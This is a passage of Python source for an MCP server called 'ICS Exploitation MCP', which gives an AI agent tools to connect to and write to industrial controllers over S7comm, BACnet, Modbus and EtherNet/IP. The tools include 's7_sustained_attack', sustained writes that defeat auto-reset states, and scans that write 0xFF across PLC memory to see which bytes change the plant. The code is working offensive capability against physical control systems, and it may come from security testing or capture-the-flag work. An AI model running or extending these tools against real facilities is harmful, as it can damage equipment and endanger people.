                {"type": "function", "function": {"name": "s7_scan_db_effects", "description": "Systematically write to each byte offset and observe HMI changes to map memory layout", "parameters": {"type": "object", "properties": {"db_number": {"type": "integer", "description": "Data block to scan"}, "status_url": {"type": "string", "description": "HMI URL to observe changes"}, "start_offset": {"type": "integer", "description": "Starting byte offset", "default": 0}, "end_offset": {"type": "integer", "description": "Ending byte offset", "default": 128}, "test_value": {"type": "string", "description": "Hex value to write", "default": "FF"}}, "required": ["db_number", "status_url"]}}},
                {"type": "function", "function": {"name": "s7_generate_payload", "description": "Generate payload patterns for testing (all_max=0xFF, all_min=0x00, alternating, random)", "parameters": {"type": "object", "properties": {"pattern": {"type": "string", "description": "Pattern: all_max, all_min, all_mid, alternating, incremental, random", "default": "all_max"}, "size": {"type": "integer", "description": "Number of bytes", "default": 128}}, "required": []}}},
            ])
        
        # BACnet tools (always available - uses socket)
        tools.extend([
            {"type": "function", "function": {"name": "bacnet_connect", "description": "Connect to BACnet CLI server (building automation)", "parameters": {"type": "object", "properties": {"host": {"type": "string", "description": "Target IP address"}, "port": {"type": "integer", "description": "BACnet CLI port"}, "timeout": {"type": "integer", "description": "Connection timeout in seconds", "default": 10}}, "required": ["host", "port"]}}},
            {"type": "function", "function": {"name": "bacnet_disconnect", "description": "Disconnect from BACnet CLI server", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "bacnet_list_objects", "description": "List all BACnet objects (sensors, thermostats, alarms, doors, etc.)", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "bacnet_read", "description": "Read BACnet object property value", "parameters": {"type": "object", "properties": {"object_type": {"type": "string", "description": "Object type: analogInput, analogOutput, binaryInput, binaryOutput, multiStateInput, multiStateOutput"}, "object_id": {"type": "integer", "description": "Object instance ID"}, "property": {"type": "string", "description": "Property name (usually 'presentValue')", "default": "presentValue"}}, "required": ["object_type", "object_id"]}}},
            {"type": "function", "function": {"name": "bacnet_write", "description": "Write BACnet object property value", "parameters": {"type": "object", "properties": {"object_type": {"type": "string", "description": "Object type: analogOutput, binaryOutput, multiStateOutput"}, "object_id": {"type": "integer", "description": "Object instance ID"}, "property": {"type": "string", "description": "Property name (usually 'presentValue')", "default": "presentValue"}, "value": {"description": "Value to write (number or boolean)"}}, "required": ["object_type", "object_id", "value"]}}},
            {"type": "function", "function": {"name": "bacnet_sustained_write", "description": "Continuously write a value to maintain state (for systems with auto-reset)", "parameters": {"type": "object", "properties": {"object_type": {"type": "string", "description": "Object type (e.g., 'analogOutput')"}, "object_id": {"type": "integer", "description": "Object instance ID"}, "property": {"type": "string", "description": "Property name", "default": "presentValue"}, "value": {"description": "Value to write continuously"}, "duration_seconds": {"type": "integer", "description": "Duration in seconds", "default": 120}, "interval_seconds": {"type": "number", "description": "Seconds between writes", "default": 2.0}, "status_url": {"type": "string", "description": "Optional HTTP endpoint to monitor for status"}}, "required": ["object_type", "object_id", "value"]}}},
            {"type": "function", "function": {"name": "bacnet_find_writable", "description": "Find all writable BACnet objects", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "bacnet_write_multiple", "description": "Write to multiple BACnet objects in a batch", "parameters": {"type": "object", "properties": {"writes": {"type": "array", "description": "List of writes: [{\"object_type\": \"analogOutput\", \"object_id\": 21, \"property\": \"presentValue\", \"value\": 100}, ...]", "items": {"type": "object"}}}, "required": ["writes"]}}},
            {"type": "function", "function": {"name": "bacnet_get_object_info", "description": "Get detailed info about a specific BACnet object", "parameters": {"type": "object", "properties": {"object_type": {"type": "string", "description": "Object type"}, "object_id": {"type": "integer", "description": "Object instance ID"}}, "required": ["object_type", "object_id"]}}},
        ])
        
        # Modbus tools (always available - uses socket)
        tools.extend([
            {"type": "function", "function": {"name": "modbus_connect", "description": "Connect to Modbus CLI server (menu-driven interface)", "parameters": {"type": "object", "properties": {"host": {"type": "string", "description": "Target IP address"}, "port": {"type": "integer", "description": "Modbus CLI port"}, "timeout": {"type": "integer", "description": "Connection timeout in seconds", "default": 10}}, "required": ["host", "port"]}}},
            {"type": "function", "function": {"name": "modbus_disconnect", "description": "Disconnect from Modbus CLI server", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "modbus_get_status", "description": "Get system status (typically menu option 1)", "parameters": {"type": "object", "properties": {}, "required": []}}},
            {"type": "function", "function": {"name": "modbus_send_raw", "description": "Send raw Modbus command as hex string (no spaces, e.g., '010500000FF00')", "parameters": {"type": "object", "properties": {"hex_command": {"type": "string", "description": "Modbus command as hex string"}}, "required": ["hex_command"]}}},
            {"type": "function", "function": {"name": "modbus_write_coil", "description": "Write single coil (Modbus FC 05). Use for on/off controls.", "parameters": {"type": "object", "properties": {"address": {"type": "integer", "description": "Coil address (0-65535)"}, "value": {"type": "boolean", "description": "True=ON, False=OFF"}, "unit_id": {"type": "integer", "description": "Modbus unit ID", "default": 1}}, "required": ["address", "value"]}}},
            {"type": "function", "function": {"name": "modbus_write_register", "description": "Write single register (Modbus FC 06). Use for numeric values.", "parameters": {"type": "object", "properties": {"address": {"type": "integer", "description": "Register address (0-65535)"}, "value": {"type": "integer", "description": "Value to write (0-65535)"}, "unit_id": {"type": "integer", "description": "Modbus unit ID", "default": 1}}, "required": ["address", "value"]}}},
            {"type": "function", "function": {"name": "modbus_read_coils", "description": "Read coils (Modbus FC 01)", "parameters": {"type": "object", "properties": {"address": {"type": "integer", "description": "Starting coil address"}, "count": {"type": "integer", "description": "Number of coils to read", "default": 1}, "unit_id": {"type": "integer", "description": "Modbus unit ID", "default": 1}}, "required": ["address"]}}},
            {"type": "function", "function": {"name": "modbus_read_registers", "description": "Read holding registers (Modbus FC 03)", "parameters": {"type": "object", "properties": {"address": {"type": "integer", "description": "Starting register address"}, "count": {"type": "integer", "description": "Number of registers to read", "default": 1}, "unit_id": {"type": "integer", "description": "Modbus unit ID", "default": 1}}, "required": ["address"]}}},
            {"type": "function", "function": {"name": "modbus_scan_coils", "description": "Scan coils to find which addresses affect the system", "parameters": {"type": "object", "properties": {"start": {"type": "integer", "description": "Starting address", "default": 0}, "end": {"type": "integer", "description": "Ending address", "default": 16}, "unit_id": {"type": "integer", "description": "Modbus unit ID", "default": 1}}, "required": []}}},
            {"type": "function", "function": {"name": "modbus_scan_write_coils", "description": "Scan a range of coils and write a value to each", "parameters": {"type": "object", "properties": {"start": {"type": "integer", "description": "Starting address", "default": 0}, "end": {"type": "integer", "description": "Ending address", "default": 10}, "set_value": {"type": "boolean", "description": "Value to write (true/false)", "default": true}, "unit_id": {"type": "integer", "description": "Modbus unit ID", "default": 1}}, "required": []}}},
        ])
        
        # EtherNet/IP tools (requires pycomm3)
        if PYCOMM3_AVAILABLE:
            tools.extend([
                {"type": "function", "function": {"name": "ethernetip_connect", "description": "Connect to EtherNet/IP controller", "parameters": {"type": "object", "properties": {"host": {"type": "string", "description": "Target IP address"}, "port": {"type": "integer", "description": "EtherNet/IP port (default 44818)", "default": 44818}}, "required": ["host"]}}},
                {"type": "function", "function": {"name": "ethernetip_disconnect", "description": "Disconnect from EtherNet/IP controller", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "ethernetip_get_identity", "description": "Get device identity information (vendor, product, serial)", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "ethernetip_read_tag", "description": "Read a tag value from the PLC by name", "parameters": {"type": "object", "properties": {"tag_name": {"type": "string", "description": "Name of the tag to read (e.g., 'Counter1', 'Status')"}}, "required": ["tag_name"]}}},
                {"type": "function", "function": {"name": "ethernetip_write_tag", "description": "Write a value to a PLC tag", "parameters": {"type": "object", "properties": {"tag_name": {"type": "string", "description": "Name of the tag to write"}, "value": {"description": "Value to write"}}, "required": ["tag_name", "value"]}}},
                {"type": "function", "function": {"name": "ethernetip_list_tags", "description": "List all available tags on the PLC", "parameters": {"type": "object", "properties": {}, "required": []}}},
                {"type": "function", "function": {"name": "ethernetip_read_cip_object", "description": "Read from CIP object (class/instance/attribute). Common classes: 0x01=Identity, 0x02=Message Router", "parameters": {"type": "object", "properties": {"class_id": {"type": "integer", "description": "CIP class ID (e.g., 0x01=Identity, 0x02=Message Router)"}, "instance": {"type": "integer", "description": "Instance number (usually 1)"}, "attribute": {"type": "integer", "description": "Specific attribute (optional, null = Get_Attributes_All)"}}, "required": ["class_id", "instance"]}}},
                {"type": "function", "function": {"name": "ethernetip_enumerate_objects", "description": "Enumerate CIP objects to find interesting data", "parameters": {"type": "object", "properties": {"class_ids": {"type": "array", "items": {"type": "integer"}, "description": "List of class IDs to check (default: [0x01, 0x02, 0x04, 0x06, 0xAC])"}, "max_instances": {"type": "integer", "description": "Maximum instances per class", "default": 5}}, "required": []}}},
            ])
        
        return tools
    
    async def call_tool(self, name: str, arguments: dict) -> Any:
        """Call a tool by name with arguments"""
        # General tools
        if name == "ics_check_installation":
            return self.check_installation()
        elif name == "ics_list_capabilities":
            return self.list_capabilities()
        elif name == "ics_get_documentation":
            return self.get_documentation(arguments.get("protocol", "general"))
        
        # OPC-UA tools
        elif name == "opcua_enumerate_endpoints":
            return self.opcua.enumerate_endpoints(arguments.get("url", ""))
        elif name == "opcua_generate_cert":
            return self.opcua.generate_self_signed_cert(arguments.get("output_dir", "."))
        elif name == "opcua_connect":
            return self.opcua.connect(
                arguments.get("url", ""),
                arguments.get("cert_path"),
                arguments.get("key_path"),
                arguments.get("security_policy", "None"),
                arguments.get("security_mode", "None")
            )
        elif name == "opcua_disconnect":
            return self.opcua.disconnect()
        elif name == "opcua_enumerate_nodes":
            return self.opcua.enumerate_nodes(arguments.get("max_depth", 5))
        elif name == "opcua_find_writable":
            return self.opcua.find_writable_variables(arguments.get("max_depth", 5))
        elif name == "opcua_get_node_info":
            return self.opcua.get_node_info(arguments.get("node_id", ""))
        elif name == "opcua_read":
            return self.opcua.read_variable(arguments.get("node_id", ""))
        elif name == "opcua_write":
            return self.opcua.write_variable(
                arguments.get("node_id", ""),
                arguments.get("value", ""),
                arguments.get("data_type", "auto")
            )
        
        # S7comm tools
        elif name == "s7_connect":
            return self.s7.connect(
                arguments.get("ip", ""),
                arguments.get("rack", 0),
                arguments.get("slot", 0),
                arguments.get("port", 102)
            )
        elif name == "s7_disconnect":
            return self.s7.disconnect()
        elif name == "s7_is_connected":
            return self.s7.is_connected()
        elif name == "s7_get_cpu_info":
            return self.s7.get_cpu_info()
        elif name == "s7_get_cpu_state":
            return self.s7.get_cpu_state()
        elif name == "s7_list_blocks":
            return self.s7.list_blocks()
        elif name == "s7_db_read":
            return self.s7.db_read(
                arguments.get("db_number", 1),
                arguments.get("offset", 0),
                arguments.get("size", 100)
            )
        elif name == "s7_db_write":
            return self.s7.db_write(
                arguments.get("db_number", 1),
                arguments.get("offset", 0),
                arguments.get("data", "")
            )
        elif name == "s7_db_get_size":
            return self.s7.db_get_size(arguments.get("db_number", 1))
        elif name == "s7_read_area":
            return self.s7.read_area(
                arguments.get("area", "DB"),
                arguments.get("db_number", 0),
                arguments.get("start", 0),
                arguments.get("size", 100)
            )
        elif name == "s7_write_area":
            return self.s7.write_area(
                arguments.get("area", "DB"),
                arguments.get("db_number", 0),
                arguments.get("start", 0),
                arguments.get("data")
            )
        elif name == "s7_sustained_attack":
            return self.s7.sustained_attack(
                arguments.get("db_number", 1),
                arguments.get("offset", 0),
                arguments.get("data", "FF"),
                arguments.get("duration_seconds", 60),
                arguments.get("interval_ms", 200),
                arguments.get("status_url")
            )
        elif name == "s7_sustained_attack_multi":
            return self.s7.sustained_attack_multi(
                arguments.get("db_number", 1),
                arguments.get("writes", []),
                arguments.get("duration_seconds", 60),
                arguments.get("interval_ms", 200),
                arguments.get("status_url")
            )
        elif name == "s7_db_write_typed":
            return self.s7.db_write_typed(
                arguments.get("db_number", 1),
                arguments.get("offset", 0),
                arguments.get("value"),
                arguments.get("data_type", "BYTE")
            )
        elif name == "s7_monitor_status":
            return self.s7.monitor_status(
                arguments.get("status_url", ""),
                arguments.get("interval_ms", 500),
                arguments.get("duration_seconds", 30)
            )
        elif name == "s7_scan_db_effects":
            return self.s7.scan_db_effects(
                arguments.get("db_number", 1),
                arguments.get("status_url", ""),
                arguments.get("start_offset", 0),
                arguments.get("end_offset", 128),
                arguments.get("test_value", "FF")
            )
        elif name == "s7_generate_payload":
            return self.s7.generate_payload(
                arguments.get("pattern", "all_max"),
                arguments.get("size", 128)
            )
        
        # BACnet tools
        elif name == "bacnet_connect":
            return self.bacnet.connect(
                arguments.get("host"),
                arguments.get("port"),
                arguments.get("timeout", 10)
            )
        elif name == "bacnet_disconnect":
            return self.bacnet.disconnect()
        elif name == "bacnet_list_objects":
            return self.bacnet.list_objects()
        elif name == "bacnet_read":
            return self.bacnet.read(
                arguments.get("object_type"),
                arguments.get("object_id"),
                arguments.get("property", "presentValue")
            )
        elif name == "bacnet_write":
            return self.bacnet.write(
                arguments.get("object_type"),
                arguments.get("object_id"),
                arguments.get("property", "presentValue"),
                arguments.get("value")
            )
        elif name == "bacnet_sustained_write":
            return self.bacnet.sustained_write(
                arguments.get("object_type"),
                arguments.get("object_id"),
                arguments.get("property", "presentValue"),
                arguments.get("value"),
                arguments.get("duration_seconds", 120),
                arguments.get("interval_seconds", 2.0),
                arguments.get("status_url")
            )
        elif name == "bacnet_find_writable":
            return self.bacnet.find_writable()
        elif name == "bacnet_write_multiple":
            return self.bacnet.write_multiple(
                arguments.get("writes", [])
            )
        elif name == "bacnet_get_object_info":
            # Read multiple properties to get object info
            obj_type = arguments.get("object_type")
            obj_id = arguments.get("object_id")
            result = {"object_type": obj_type, "object_id": obj_id}
            for prop in ["presentValue", "objectName", "description"]:
                read_result = self.bacnet.read(obj_type, obj_id, prop)
                if read_result.get("success"):
                    result[prop] = read_result.get("value")
            return result
        
        # Modbus tools
        elif name == "modbus_connect":
            return self.modbus.connect(
                arguments.get("host"),
                arguments.get("port"),
                arguments.get("timeout", 10)
            )
        elif name == "modbus_disconnect":
            return self.modbus.disconnect()
        elif name == "modbus_get_status":
            return self.modbus.get_status()
        elif name == "modbus_send_raw":
            return self.modbus.send_modbus_raw(arguments.get("hex_command"))
        elif name == "modbus_write_coil":
            return self.modbus.write_coil(
                arguments.get("address"),
                arguments.get("value"),
                arguments.get("unit_id", 1)
            )
        elif name == "modbus_write_register":
            return self.modbus.write_register(
                arguments.get("address"),
                arguments.get("value"),
                arguments.get("unit_id", 1)
            )
        elif name == "modbus_read_coils":
            return self.modbus.read_coils(
                arguments.get("address"),
                arguments.get("count", 1),
                arguments.get("unit_id", 1)
            )
        elif name == "modbus_read_registers":
            return self.modbus.read_registers(
                arguments.get("address"),
                arguments.get("count", 1),
                arguments.get("unit_id", 1)
            )
        elif name == "modbus_scan_coils":
            return self.modbus.scan_coils(
                arguments.get("start", 0),
                arguments.get("end", 16),
                arguments.get("unit_id", 1)
            )
        elif name == "modbus_scan_write_coils":
            return self.modbus.scan_write_coils(
                arguments.get("start", 0),
                arguments.get("end", 10),
                arguments.get("set_value", True),
                arguments.get("unit_id", 1)
            )
        
        # EtherNet/IP tools
        elif name == "ethernetip_connect":
            return self.ethernetip.connect(
                arguments.get("host"),
                arguments.get("port", 44818)
            )
        elif name == "ethernetip_disconnect":
            return self.ethernetip.disconnect()
        elif name == "ethernetip_get_identity":
            return self.ethernetip.get_identity()
        elif name == "ethernetip_read_tag":
            return self.ethernetip.read_tag(arguments.get("tag_name"))
        elif name == "ethernetip_write_tag":
            return self.ethernetip.write_tag(
                arguments.get("tag_name"),
                arguments.get("value")
            )
        elif name == "ethernetip_list_tags":
            return self.ethernetip.list_tags()
        elif name == "ethernetip_read_cip_object":
            return self.ethernetip.read_cip_object(
                arguments.get("class_id"),
                arguments.get("instance"),
                arguments.get("attribute")
            )
        elif name == "ethernetip_enumerate_objects":
            return self.ethernetip.enumerate_cip_objects(
                arguments.get("class_ids"),
                arguments.get("max_instances", 5)
            )
        
        else:
            raise ValueError(f"Unknown tool: {name}")


# =============================================================================
# MCP SERVER ENTRY POINT
# =============================================================================

async def run_mcp_server():
    """Run as MCP server for Cursor/Claude Desktop integration."""
    try:
        from mcp.server import Server
        from mcp.server.stdio import stdio_server
        from mcp import types
    except ImportError:
        print("Error: mcp package not found. Install via: pip install mcp", file=sys.stderr)
        sys.exit(1)
    
    server = Server("ics-exploitation-mcp")
    mcp_instance = None
    
    def get_mcp_instance():
        nonlocal mcp_instance
        if mcp_instance is None:
            mcp_instance = ICSExploitationMCP()
        return mcp_instance
    
    @server.list_tools()
    async def handle_list_tools():
        try:
            instance = get_mcp_instance()
            tools = [
                types.Tool(
                    name=tool["function"]["name"],
                    description=tool["function"]["description"],
                    inputSchema=tool["function"]["parameters"]
                )
                for tool in instance.get_tools()
            ]
            return tools
        except Exception as e:
            print(f"Error in list_tools: {e}", file=sys.stderr)
            return []
    
    @server.call_tool()
    async def handle_call_tool(name: str, arguments: dict):
        try:
            instance = get_mcp_instance()
            result = await instance.call_tool(name, arguments)
            if isinstance(result, dict):
                return [types.TextContent(type="text", text=json.dumps(result, indent=2, default=str))]
            else:
                return [types.TextContent(type="text", text=str(result))]
        except Exception as e:
            print(f"Error in call_tool({name}): {e}", file=sys.stderr)
            return [types.TextContent(type="text", text=json.dumps({"error": str(e)}, indent=2))]
    
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream, server.create_initialization_options())


def main():
    """
    Main entry point - detects mode and runs appropriately.
    
    If running as MCP server (stdin not a TTY): Start MCP protocol server
    If running directly (TTY): Run self-test
    """
    if _RUNNING_AS_MCP:
        # MCP Server mode
        asyncio.run(run_mcp_server())
    else:
        # Self-test mode
        print("ICS Exploitation MCP v1.0.0")
        print("=" * 60)
        print("Unified Industrial Control Systems Security Toolkit")
        print("=" * 60)
        
        mcp = ICSExploitationMCP()
        status = mcp.check_installation()
        
        print("\nProtocol Status:")
        print("-" * 40)
        
        opcua_status = status['protocols']['opcua']
        print(f"OPC-UA: {'[OK]' if opcua_status['available'] else '[NOT READY]'}")
        if not opcua_status['available']:
            print(f"  Install: {opcua_status['install']}")
        
        s7_status = status['protocols']['s7comm']
        print(f"S7comm: {'[OK]' if s7_status['available'] else '[NOT READY]'}")
        if not s7_status['available']:
            print(f"  Install: {s7_status['install']}")
        
        bacnet_status = status['protocols']['bacnet']
        print(f"BACnet: {'[OK]' if bacnet_status['available'] else '[NOT READY]'}")
        
        print(f"\nAny protocol ready: {status['any_protocol_ready']}")
        
        if status['any_protocol_ready']:
            print("\nUsage:")
            print("  As MCP Server: Configure in .cursor/mcp.json or claude_desktop_config.json")
            print("  As Library:    from ics_exploitation_mcp import ICSExploitationMCP")
            print("\nExample:")
            print("  mcp = ICSExploitationMCP()")
            print("  # OPC-UA: mcp.opcua.enumerate_endpoints('opc.tcp://target:4840')")
            print("  # S7comm: mcp.s7.connect('192.168.1.1', 0, 0, 102)")
            print("  # BACnet: mcp.bacnet.connect('192.168.1.1', 48103)")


if __name__ == "__main__":
    main()
